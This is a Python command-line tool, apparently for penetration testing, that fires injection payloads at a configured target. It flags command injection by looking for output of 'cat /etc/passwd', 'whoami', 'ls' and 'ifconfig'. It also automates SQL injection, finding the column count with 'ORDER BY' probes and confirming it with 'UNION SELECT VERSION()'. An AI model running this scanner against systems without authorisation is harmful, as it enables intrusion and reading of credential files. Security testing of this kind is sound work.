from config import *
import requests
import os
from datetime import datetime
import itertools
import re
import click

def write_vulnerabilty_report(vulnerabilities_lines):
    directories, filename = os.path.split(VULNERABILITY_OUTPUT_PATH)

    if not os.path.exists(directories):
        os.makedirs(directories)

    with open(VULNERABILITY_OUTPUT_PATH, 'a+') as f:
        for message in vulnerabilities_lines:
            f.write(f'{message}\n')

def elaborate_response(http_method, url_under_test, parameters_and_values, response, vulnerabilities_lines):
    url_under_test = url_under_test[1:] # remove initial slash

    if DEBUG:
        print(f'\n[DEBUG] - URL: {url_under_test}')
        print(f'[DEBUG] - HTTP METHOD: {http_method}')
        print(f'[DEBUG] - COMPLETE URL: {response.url}')
        print(f'[DEBUG] - PARAMETERS AND VALUES: {parameters_and_values}')
        
        print('[DEBUG] - RESPONSE')
        print(response.text)

    number_of_columns = None

    for parameter, value in parameters_and_values.items():
        message = f'Found a command injection for URL: {url_under_test}, HTTP method: {http_method}, parameter: {parameter}, payload: {value}'
        
        # skip already checked combination
        if message in vulnerabilities_lines:
            continue

        vulnerable = False

        # check expected results
        if 'ls' in value:
            if url_under_test in response.text:
                vulnerable = True
        elif 'cat /etc/passwd' in value:
            if 'root' in response.text:
                vulnerable = True
        elif ('head' in value or 'grep php' in value) and '.php' in value:
            if '<?php' in response.text:
                vulnerable = True
        elif 'whoami' in value:
            if CURRENT_USER in response.text:
                vulnerable = True
        elif 'ifconfig | grep inet' in value:
            if 'inet' in response.text:
                vulnerable = True
        elif re.findall('[\'"1] ORDER BY \d+ -- -', value): # if the payload contais command to find the number of columns
            if not response.text and 500 == response.status_code: # response is empty if column number is out of range
                columns_number = int(re.findall('\d+', value)[-1])-1 # correct columns number = previous
                return columns_number

        if vulnerable:
            print(message)
            vulnerabilities_lines.append(f'{datetime.now()} - {message}')

    return number_of_columns

# read requests details
def read_requests_details(requests_file, requests_dict):
    with open(requests_file) as f:
        for line in f:
            values = line.strip().split(REQUESTS_SPLIT_VAL)

            requests_dict.append({ 
                'method':  values[0],
                'url': values[1],
                'parameters': values[2].split(REQUESTS_PARAMETERS_SPLIT_VAL),
            })

# read payloads to inject
def read_payloads(payloads_file, requests_dict):
    with open(payloads_file) as f:          
        i = 0

        for line in f:
            payloads = line.strip().split(PAYLOADS_SPLIT_VAL)

            # can't inject other payload with the command to find the columns number
            if len(payloads) > 1 and payloads[i].startswith(COMMAND_COLUMNS_NUMBER):
                print(f'Only one payload can be injected with the {COMMAND_COLUMNS_NUMBER} command')
                raise ValueError()

            requests_dict[i]['payloads'] = payloads
            i += 1

        if i != len(requests_dict):
            raise IndexError()

def send_request(request_details, data, final_url):
    if 'GET' == request_details['method'].upper():
        return requests.get(final_url, params=data)
    
    if 'POST' == request_details['method'].upper():
        return requests.post(final_url, data=data)

    print(f'Method {request_details["method"]} is not supported. Check your input file')
    raise ValueError

def send_confirmation_request(original_request_data, number_of_columns, request, payload, pre_order_by_value, vulnerabilities_lines):
    end_loop = False

    columns_values = ['VERSION()']

    for i in range(1, number_of_columns): # skip a column, first one is replaced by the version command
        columns_values.append(i)

    for column_value in list(itertools.permutations(columns_values)):
        confirmation_query = 'UNION SELECT '

        for column_val in column_value:
            confirmation_query += f'{column_val}, '
    
        confirmation_query = confirmation_query[:-2] # remove extra chars

        confirmation_data = { }

        for i in range(len(request['parameters'])):
            if COMMAND_COLUMNS_NUMBER == payload[i]:
                confirmation_data[request['parameters'][i]] = f'{pre_order_by_value} {confirmation_query} -- -'
            else:
                confirmation_data[request['parameters'][i]] = payload[i]

        response = send_request(request, confirmation_data, TARGET + request['url'])

        if re.findall('\d.\d.[\d.]+', response.text): # check if the response contains a version format string
            url_under_test = request['url'][1:] # remove initial slash

            if DEBUG:
                print('[DEBUG] - STARTING VULNERABILITY CONFIRMATION')
                print(f'[DEBUG] - URL: {url_under_test}')
                print(f'[DEBUG] - HTTP METHOD: {request["method"]}')
                print(f'[DEBUG] - COMPLETE URL: {response.url}')
                print(f'[DEBUG] - PARAMETERS AND VALUES: {confirmation_data}')
                
                print('[DEBUG] - RESPONSE')
                print(response.text)

            # loop over previous request data
            for parameter, value in original_request_data.items():
                if not re.findall('[\'"1] ORDER BY \d+ -- -', value):
                    continue

                message = f'Found a command injection for URL: {request["url"][1:]}, HTTP method: {request["method"]}, parameter: {parameter}, payload: {value}. The table has {number_of_columns} column(s)'

                # skip already checked combination
                if message in vulnerabilities_lines:
                    continue

                print(message)
                vulnerabilities_lines.append(f'{datetime.now()} - {message}')

            end_loop = True

            if DEBUG:
                print('[DEBUG] - VULNERABILITY CONFIRMATION FINISHED')

        if end_loop:
            break

    return end_loop

def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, is_sql_run):
    for request in requests_dict:
        final_url = TARGET + request['url']

        if len(request['parameters']) > 1 and 1 == len(request['payloads']):
            # append valid values to allows permutations (single payload in different parameters)
            for _ in range(len(request['parameters']) - len(request['payloads'])):
                request['payloads'].append('valid_string')

        # set current ORDER BY value
        current_column_number = 1

        # used to prepend char in ORDER BY command
        pre_order_by_values = ['\'', '"', '1']

        while True:
            end_loop = False

            noc_command_in_payloads = COMMAND_COLUMNS_NUMBER in request['payloads']
            
            # permutations of payloads based on parameters length
            for payload in list(itertools.permutations(request['payloads'], len(request['parameters']))):
                # if payload contains the command to find the number of columns and the run is set to sql mode 
                if noc_command_in_payloads and is_sql_run:
                    for pre_order_by_value in pre_order_by_values[:]: # loop over a copy of the list because elements can be removed
                        data = { }
                        
                        for i in range(len(request['parameters'])):
                            if COMMAND_COLUMNS_NUMBER == payload[i]:
                                data[request['parameters'][i]] = f'{pre_order_by_value} ORDER BY {current_column_number} -- -'
                            else:
                                data[request['parameters'][i]] = payload[i]

                        response = send_request(request, data, final_url)

                        if 404 == response.status_code:
                            if DEBUG:
                                print(f'[DEBUG] - FILE NOT FOUND: {request["url"]}')
                            
                            end_loop = True
                            break

                        number_of_columns = elaborate_response(request['method'], request['url'], data, response, vulnerabilities_lines)

                        # type or quotes error
                        if 0 == number_of_columns:
                            pre_order_by_values.remove(pre_order_by_value) # remove invalid char
                        elif number_of_columns: # if the number of columns is found, send a confirmation request
                            end_loop = send_confirmation_request(data, number_of_columns, request, payload, pre_order_by_value, vulnerabilities_lines)
                            
                        # found and confirmed number of columns
                        if end_loop:
                            break
                else: # simply inject commands
                    data = { }
                    
                    for i in range(len(request['parameters'])):
                        data[request['parameters'][i]] = payload[i]
                    
                    response = send_request(request, data, final_url)

                    end_loop = True

                    if 404 == response.status_code:
                        if DEBUG:
                            print(f'[DEBUG] - FILE NOT FOUND: {request["url"]}')
                        
                        break
                    
                    elaborate_response(request['method'], request['url'], data, response, vulnerabilities_lines)

                if end_loop:
                    break

            # found and confirmed number of columns
            if end_loop or not noc_command_in_payloads:
                break

            current_column_number += 1

@click.command()
@click.option('--mode', '-m', help='Injection mode [sql, cmd]', type=click.Choice(['sql', 'cmd']), required=True)
@click.option('--irequests', '-r', help='Requests details file', required=True)
@click.option('--ipayloads', '-p', help='Payloads file', required=True)
def main(mode, irequests, ipayloads):
    requests_dict = [ ]

    try:
        read_requests_details(irequests, requests_dict)
        read_payloads(ipayloads, requests_dict)
    
        if DEBUG:
            print('[DEBUG] - REQUESTS DICTIONARY')
            print(requests_dict)

        vulnerabilities_lines = [ ]

        prepare_data_and_send_request(requests_dict, vulnerabilities_lines, 'sql' == mode)
        write_vulnerabilty_report(vulnerabilities_lines)
    except ValueError:
        exit()
    except IndexError:
        print('Error: mismatching rows number between requests-details and payloads files')
        exit()
    except FileNotFoundError:
        print('Error: file not found. Check command-line options')

if __name__ == '__main__':
    main()